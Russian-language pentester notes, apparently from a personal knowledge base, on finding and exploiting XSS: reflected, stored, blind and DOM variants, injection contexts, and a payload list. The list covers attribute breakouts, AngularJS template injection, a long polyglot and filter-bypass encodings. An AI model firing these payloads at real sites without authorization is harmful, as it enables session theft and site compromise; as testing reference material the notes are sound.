
# 1. Поиск уязвимости

## 1.1 Определить вид XSS-атаки:
- Отраженные - код исполняется серверными сценариями и не хранится в базе данных
- Хранимые - код хранится в базе данных
- Через DOM - код сохраняется и выполняется в браузере

#### 1.2 Отраженные
##### Точки входа:
- Параметры URL
	Тестировать каждую точку входа, например, в запросах типа GET, как в примере: `https://example.com/search?query=<script>alert('XSS!');</script>`
- Формы ввода
	Ввод данных через формы (например, поля поиска, регистрации или обратной связи), которые могут напрямую отражать введенные значения на странице.
- HTTP-заголовки
	Заголовки запроса, такие как Referer, User-Agent и другие, могут быть использованы для передачи вредоносного кода. Пример: `Referer: https://attacker.com/?data=<script>alert('XSS!');</script>`
- Параметры в теле POST-запросов
	Проверка содержимого, отправляемого через POST-запросы, так как некоторые приложения могут отражать эти данные в ответе.
- Сессионные идентификаторы и токены
	Если приложение использует идентификаторы сессий или токены в URL или формах, их также следует тестировать на уязвимость к XSS.
- Атрибуты HTML
	Некоторые приложения могут отображать пользовательские данные в атрибутах HTML (например, alt, title, data-), что также требует проверки. Пример данные в атрибут `title`, например, `<div title="<script>alert('XSS!');</script>">Hover me!</div>`
- Контекст отражения
	Определите контекст, в котором данные будут отображаться. Например, текст может быть вставлен в HTML, JavaScript, CSS или URL. Это поможет выбрать правильные полезные нагрузки для тестирования.
- Тестирование потенциальной полезной нагрузки
	Используйте различные полезные нагрузки для проверки уязвимости, включая простые скрипты и более сложные сценарии. Пример: 
	`<img src=x onerror="alert('XSS!')">`
- Тестируйте альтернативные полезные нагрузки
	Разнообразьте тесты с помощью различных кодировок и методов (например, URL-кодирование, HTML-кодирование), чтобы выявить возможные уязвимости.
- Протестируйте атаку в браузере
	Выполняйте тесты в реальном браузере, чтобы увидеть, как приложение обрабатывает вредоносный код и отразит ли его на странице.

#### 1.3 Хранимые

##### Точки входа:
- **Параметры в URL и теле сообщения**
	Данные, передаваемые через GET или POST-запросы.
- **Путь к файлу URL**
	Входные данные, которые могут быть обработаны приложением.
- **HTTP-заголовки**
	Заголовки запроса, которые могут содержать уязвимые данные.
- **Внеполосные маршруты**
	Данные из внешних источников (например, электронные письма, сторонние твиты, агрегированные новости).

##### Точки выхода:
- **HTTP-ответы**
	Все ответы, возвращаемые пользователю, могут содержать вредоносные данные.
- **Отображаемые имена и другие пользовательские данные**
	Могут быть выданы в скрытых или видимых частях приложения (например, журналы аудита).
- **Данные, хранящиеся в приложении**
	Уязвимы к перезаписи через другие функции (например, результаты поиска).


#### 1.3.1 Хранимые Blind

- Имеют такие же точки входа, но проблема в том что мы не можем сразу увидеть результат

- Необходимо учитывать множество контекстов, в которых может выполняться код: 
	внутри одинарных или двойных кавычек, различных атрибутов и т.д.


#### 1.4 Через DOM

- Из-за различий в реализациях DOM некоторые браузеры оказываются уязвимыми, некоторые — нет. 

----

# 2 [[Методика эксплуатации отражённой XSS|Эксплуатация отражённой]]

## 2.1 [[Контексты межсайтового скриптинга|Определение контекста]]

- XSS между тегами HTML
- XSS в атрибутах тега HTML
- XSS в JavaScript
	Завершение существующего скрипта
	Вырывание строки JavaScript
	Использование HTML-кодирования
	XSS в литералах шаблонов JavaScript
- XSS через внедрение шаблона на стороне клиента



----
# 2.3 [[Методика эксплуатации хранимой видимой XSS|Эксплуатация Хранимой видимой]]

### Варианты полезной нагрузки

`<script>alert('XSS Attack!');</script>`
	простое окошко xss атаки

`<img src="invalid.jpg" onerror=alert('XSS Attack!')>` 
	payload находится внутри обработки тега изображения и сработает когда изображение не загрузится

`<img src="valid.jpg" onload=alert('XSS Attack!')>` 
	payload находится внутри обработки тега изображения и сработает когда изображение загрузится

jQuery с `URLSearchParams(window.location.search)`
	 `javascript:alert(document.cookie)`

jQuery c `location.hash`
`/#Say It With Flowers - Or Maybe Not onload="this.src+='<img src="1" onerror=alert(1)>'">`

AngularJS c {{ }}
`{{ метод.constructor('') }}`
`{{ $eval.constructor('alert1')() }}` 

### Методы обхода защит

`&lt;script&gt;alert(1)&lt;/script&gt;`
	Экранировать html

`%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e`
	url кодировка

`<div title="xss' onmouseover='alert(1)"></div>`
	В атрибуты html

`<><img src="0" onerror="alert(1)">`
	Обход очищения от тегов при неверной конфигурации 


# 2.2 Эксплуатация Хранимой blind

`'><script>alert('XSS Attack!');</script>`
	выход за пределы атрибута в одинарных кавычках

`'"><script>alert('XSS Attack!');</script>`
	Выход за пределы атрибута в одинарных и двойных кавычках

`-->'"><script>alert('XSS Attack!');</script>`
	Выход за пределы HTML-комментария

`</textarea>'><script>alert('XSS Attack!');</script>`
	Выход за пределы  `<textarea>`

`</style></textarea>'><script>alert('XSS Attack!');</script>`
	Выход за пределы элемента `<style>`

### XSS-полиглоты

- Проверять различные параметры может помочь использование полиглотов это специальные пейлоады, которые могут выполняться в различных контекстах HTML и JavaScript.

Они предназначены для обхода фильтров и защиты, которые могут быть установлены на веб-приложении.
```
javascript:/*--></marquee></script></title></textarea></noscript></style></xmp>">[img=1]<img -/style=-=expression&#40&#47;&#42;’/-/*&#39;,/**/eval(name)//&#41;;width:100%;height:100%;position:absolute;behavior:url(#default#VML);-o-link:javascript:eval(title);-o-link-source:current name=alert(1) onerror=eval(name) src=1 autofocus onfocus=eval(name) onclick=eval(name) onmouseover=eval(name) background=javascript:eval(name)//>
```
Существуют множество пейлоадов-полиглотов, которые можно найти в репозиториях, таких как SecLists или [fuzzdb](https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/XSSPolyglot.txt)




# 3. Эксплуатация Через DOM

- приемник, поддерживающий динамическое выполнение кода, например `eval()`или `innerHTML`. позволяет эксплуатировать 

- document.write() - работает с `<script></script>`
- innerHTML - позволяет получать или устанавливать HTML-содержимое элемента
# 4. Обход защит от xss

- **Использование альтернативных тегов и атрибутов** 
	 `<img src="x" onerror="alert('XSS')">` 

- **Обфускация кода**
	`<scr`**`<script>`**`ipt>alert('XSS')``</scr`**`<script>`**`ipt>`

- **Использование JavaScript URI**  
	 `<a href="javascript:alert('XSS')">Click me</a>`

- **HTML Entities сущности**
     `&lt;script&gt;alert('XSS')&lt;/script&gt;` 

- **Динамическое создание скриптов**
	 `setTimeout("alert('XSS')", 1000);`
 
- **Пробелы и специальные символы**
	`<script src="data:text/javascript;base64,YWxlcnQoJ1hTUycp"></script>`

- **Кросс-доменные запросы**
   • Использование кросс-доменных запросов (CORS) для выполнения скриптов с другого домена.

- **HTML теги**
	тег `body`: `<BODY ONLOAD=alert('XSS')>`

- **URL кодировка**
	`<script>alert(XSS)</script>`  в `%3Cscript%3Ealert%28XSS%29%3C%2Fscript%3E`

